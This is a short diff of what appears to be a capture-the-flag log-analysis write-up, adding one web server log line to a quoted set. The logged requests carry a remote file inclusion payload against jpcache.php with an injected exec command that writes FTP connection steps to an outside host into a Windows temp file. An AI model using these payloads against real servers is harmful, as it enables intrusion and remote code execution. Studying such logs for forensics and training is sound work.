@@ -49,6 +49,8 @@ for line in f:
 127.0.0.1 - - [01/Jan/1970:00:00:00 +0000] "GET /class/jpcache/jpcache.php?_PSL[classdir]=http://cirt.net/rfiinc.txt??exec=echo open hy17-evilftp.spb.ctf.su 11021 > c:\windows\temp\s.txt HTTP/1.1" 200 1533 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.4"
 
 127.0.0.1 - - [01/Jan/1970:00:00:00 +0000] "GET /class/jpcache/jpcache.php?_PSL[classdir]=http://cirt.net/rfiinc.txt??exec=echo jameed08>> c:\windows\temp\s.txt HTTP/1.1" 200 1507 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.4"
+
+127.0.0.1 - - [01/Jan/1970:00:00:00 +0000] "GET /class/jpcache/jpcache.php?_PSL[classdir]=http://cirt.net/rfiinc.txt??exec=echo correcthorsebatterystaple>> c:\windows\temp\s.txt HTTP/1.1" 200 1739 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.4"
 ```
 
 **Host - hy17-evilftp.spb.ctf.su  
